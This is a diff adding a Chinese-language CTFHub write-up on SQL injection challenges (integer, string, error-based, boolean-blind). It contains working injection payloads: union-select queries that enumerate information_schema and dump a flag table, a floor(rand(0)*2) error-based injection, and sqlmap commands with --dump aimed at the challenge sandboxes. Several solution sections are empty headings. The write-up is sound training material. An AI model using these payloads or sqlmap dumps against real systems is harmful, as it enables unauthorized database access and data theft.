@@ -1,0 +1,198 @@
+CTFHub题解-技能树-Web（web工具配置-SQL注入）
+
+本文章讲到的  整数型、字符型、报错注入、布尔盲注  都可以用sqlmap脚本自动解决。
+
+而且笔者觉得，像笔者这种新手小菜鸡， sqlmap 简直太好用了qwq~
+
+但是，针对这几种注入，笔者在  知识点模块  会说一下手工注入的思路。
+
+（一）整数型注入
+
+1.知识点
+
+整数型注入
+
+（1）检查是否存在注入
+
+and 1=1 返回正确
+
+and 1=2 返回错误
+
+（2）猜字段数
+
+order by x（x为数字）
+
+得出字段数
+
+（3）爆数据库名
+
+?id=1 and 1=2 union select 1,database()
+
+得到数据库名称sqli
+
+（4）爆表名
+
+?id=1 and 1=2 union select 1,group_concat(table_name)from information_schema.tables where table_schema='sqli'
+
+得到表名 news,flag
+
+（5）爆列名
+
+?id=1 and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_name='flag'
+
+得到字段名flag
+
+（6）爆字段内容（flag）
+
+?id=1 and 1=2 union select 1,group_concat(flag) from sqli.flag
+
+2.题解
+
+sqlmap工具方法：
+
+手工注入方法：
+
+（二）字符型注入
+
+1.知识点
+
+字符型注入
+
+字符型注入要考虑到  引号闭合  和  注释
+
+（1）判断注入
+
+?id=1' and 1=1 --+ 返回正确
+
+?id=1' and 1=2 --+ 返回错误
+
+（2）猜字段
+
+?id=1' order by 2 --+ 返回正确
+
+?id=1' order by 3 --+ 返回错误
+
+得出字段数为 2
+
+下面为测试空格字符代替情况 （可跳过）
+
+?id=1' order by 2 -- - 返回正确
+
+?id=1' order by 2 -- / 返回正确
+
+（3）爆数据库名
+
+?id=1' and 1=2 union select 1,database()--+
+
+得到数据库sqli
+
+（4）爆表名
+
+?id=1' and 1=2 union select 1,group_concat(table_name)from information_schema.tables where table_schema='sqli'--+
+
+（5）爆列名
+
+?id=1' and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_name='flag'--+
+
+（6）爆字段内容（flag）
+
+?id=1' and 1=2 union select 1,group_concat(flag) from sqli.flag--+
+
+2.题解
+
+sqlmap工具法：
+
+python sqlmap.py -u http://challenge-d390b9f3ff349c16.sandbox.ctfhub.com:10080/?id=1%27 --tables
+ 
+python sqlmap.py -u http://challenge-d390b9f3ff349c16.sandbox.ctfhub.com:10080/?id=1%27 -T flag --columns --dump
+
+手工注入：
+
+联合查询
+
+（三）报错注入
+
+1.知识点
+
+报错注入的原理在于三个函数： count(*),rand(),floor()以及group by
+
+floor()函数 的作用是返回小于等于该值的最大整数,也可以理解为向下取整，只保留整数部分。
+
+rand()函数 可以用来生成0或1，但是rand(0)和rand()还是有本质区别的，rand(0)相当于给rand()函数传递了一个参数，然后rand()函数会根据0这个参数进行随机数成成。rand()生成的数字是完全随机的，而rand(0)是有规律的生成。
+
+group by 进行分组查询的时候，数据库会生成一张虚拟表，在虚拟表中，group by后面的字段作为主键，所以这张表中主键是name，这样我们就基本弄清报错的原因了，其原因主要是因为虚拟表的主键重复。
+
+按照MySQL的官方说法，group by要进行两次运算，第一次是拿group by后面的字段值到虚拟表中去对比前，首先获取group by后面的值；第二次是假设group by后面的字段的值在虚拟表中不存在，那就需要把它插入到虚拟表中，这里在插入时会进行第二次运算，由于rand函数存在一定的随机性，所以第二次运算的结果可能与第一次运算的结果不一致，但是这个运算的结果可能在虚拟表中已经存在了，那么这时的插入必然导致主键的重复，进而引发错误。
+
+（1）爆数据库、表名、列名
+
+?id=1 Union select count(*),concat(database(),0x26,floor(rand(0)*2))x from information_schema.columns group by x;
+
+（2）表名
+
+（表不止一个，需要一个个查，这里查了两次）
+
+?id=1 Union select count(*),concat((select table_name from information_schema.tables where table_schema='sqli' limit 0,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x
+ 
+?id=1 Union select count(*),concat((select table_name from information_schema.tables where table_schema='sqli' limit 1,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x
+
+（3）列名
+
+?id=1 Union select count(*),concat((select column_name from information_schema.columns where table_schema='sqli' and table_name='flag' limit 0,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x
+
+（4）字段内容（flag）
+
+?id=1 Union select count(*),concat((select flag from flag limit 0,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x
+
+2.题解
+
+sqlmap工具法：
+
+手工注入：
+
+（四）布尔盲注
+
+1.知识点
+
+布尔盲注
+
+回显是 query_success 或者 error
+
+布尔盲注回显error ：数据库查询结果为空或者查询语句报错，回显error。（通常and 后面布尔盲注语句就不行了，因为它们是根据查询结果为空来判断。）
+
+布尔盲注回显success ：数据库查询为空，返回还是success，只有当查询语句报错时才返回error。
+
+子查询返回的结果必须只有一条记录，否则会报错
+
+?id=if(1=1,1,(select table_name from information_schema.tables))
+
+?id=if(1=2,1,(select table_name from information_schema.tables))
+
+2.题解
+
+sqlmap工具法：
+
+python sqlmap.py -u http://challenge-ba06d4afa77b9bd9.sandbox.ctfhub.com:10080/?id=1 --dbs
+
+python sqlmap.py -u http://challenge-ba06d4afa77b9bd9.sandbox.ctfhub.com:10080/?id=1 -D sqli --tables
+
+python sqlmap.py -u http://challenge-ba06d4afa77b9bd9.sandbox.ctfhub.com:10080/?id=1 -D sqli -T flag --columns --dump
+
+python脚本法：
+
+参考一位大佬的python脚本：
+
+运行结果：
+
+【整数型、字符型、报错注入、布尔盲注】 的部分就完成啦！
+
+【整数型、字符型、报错注入、布尔盲注】 的部分就完成啦！
+
+参考资料：
+
+https://blog.csdn.net/weixin_44732566/article/details/104455318
+
+https://blog.csdn.net/weixin_44732566/article/details/104417351
+
+https://www.cnblogs.com/richardlee97/p/10617115.html
+
